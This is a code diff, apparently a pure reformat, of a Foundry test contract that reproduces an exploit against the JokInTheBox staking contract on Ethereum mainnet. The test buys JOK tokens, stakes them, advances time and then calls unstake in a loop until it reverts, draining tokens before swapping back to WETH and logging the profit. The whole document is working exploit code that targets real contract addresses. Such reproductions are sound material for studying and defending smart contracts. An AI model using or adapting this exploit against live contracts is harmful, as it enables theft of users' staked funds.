@@ -17,51 +17,42 @@ interface IJokInTheBox is IERC20 {
     }
 
     function stake(uint256 amount, uint256 lockPeriod) external;
-    function unstake(uint256 stakeIndex) external;
-    function validLockPeriods(uint256) external view returns(LockPeriod memory);
+    function unstake(
+        uint256 stakeIndex
+    ) external;
+    function validLockPeriods(
+        uint256
+    ) external view returns (LockPeriod memory);
 }
 
 contract JokInTheBoxExploit is Test {
-    IJokInTheBox jokStake_ =
-        IJokInTheBox(address(0xA6447f6156EFfD23EC3b57d5edD978349E4e192d));
+    IJokInTheBox jokStake_ = IJokInTheBox(address(0xA6447f6156EFfD23EC3b57d5edD978349E4e192d));
 
     IERC20 jok_ = IERC20(address(0xA728Aa2De568766E2Fa4544Ec7A77f79c0bf9F97));
     IERC20 weth_ = IERC20(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
 
-    Uni_Router_V2 router_ =
-        Uni_Router_V2(
-            payable(address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D))
-        );
-
+    Uni_Router_V2 router_ = Uni_Router_V2(payable(address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D)));
 
     function setUp() public {
-        vm.createSelectFork("mainnet", 20054628);
+        vm.createSelectFork("mainnet", 20_054_628);
         jok_.approve(address(router_), type(uint256).max);
-        jok_.approve(address(jokStake_),  type(uint256).max);
+        jok_.approve(address(jokStake_), type(uint256).max);
     }
 
     function testExploit() public {
-
         address[] memory path = new address[](2);
         path[0] = address(weth_); // weth
         path[1] = address(jok_); // token
 
         vm.deal(address(this), 0.2 ether); // flashLoan
-        router_.swapExactETHForTokens{value: 0.2 ether}(
-            0,
-            path,
-            address(this),
-            block.timestamp
-        );
-
+        router_.swapExactETHForTokens{value: 0.2 ether}(0, path, address(this), block.timestamp);
 
         jokStake_.stake(jok_.balanceOf(address(this)), 1);
 
         vm.warp(block.timestamp + 3 days);
-        while(true){
-            try jokStake_.unstake(0){
-
-            }catch{
+        while (true) {
+            try jokStake_.unstake(0) {}
+            catch {
                 break;
             }
         }
@@ -70,11 +61,7 @@ contract JokInTheBoxExploit is Test {
         path[1] = address(weth_); // weth
 
         router_.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            jok_.balanceOf(address(this)),
-            0,
-            path,
-            address(this),
-            block.timestamp
+            jok_.balanceOf(address(this)), 0, path, address(this), block.timestamp
         );
         weth_.transfer(address(0xdead), 0.2 ether); //repay flashloan
         emit log_named_decimal_uint("weth profit = ", weth_.balanceOf(address(this)), 18);
